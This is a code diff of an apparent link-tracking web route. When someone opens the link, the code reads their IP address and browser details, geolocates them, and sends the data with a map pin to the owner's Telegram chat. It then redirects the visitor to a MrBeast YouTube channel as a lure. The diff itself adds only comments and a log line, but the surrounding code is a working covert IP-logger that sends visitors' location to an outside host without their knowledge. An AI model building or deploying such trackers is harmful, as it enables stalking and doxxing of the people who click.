@@ -38,6 +38,7 @@ def track_redirect(slug):
     user_agent = request.headers.get('User-Agent', 'Unknown')
     location = get_location_from_ip(visitor_ip)
     
+    # Default redirect if something fails
     redirect_url = "https://www.youtube.com/@MrBeast"
     
     if BOT_TOKEN and OWNER_CHAT_ID and location:
@@ -55,17 +56,22 @@ def track_redirect(slug):
 🕐 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
 ━━━━━━━━━━━━━━━━━━━
 """
+            # Send text message
             requests.post(
                 f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                 json={'chat_id': OWNER_CHAT_ID, 'text': message, 'parse_mode': 'HTML'},
                 timeout=5
             )
             
+            # Send location pin
             requests.post(
                 f"https://api.telegram.org/bot{BOT_TOKEN}/sendLocation",
                 json={'chat_id': OWNER_CHAT_ID, 'latitude': lat, 'longitude': lon},
                 timeout=5
             )
+            
+            logging.info(f"📍 Location sent! {lat}, {lon}")
+            
         except Exception as e:
             logging.error(f"Error: {e}")
     
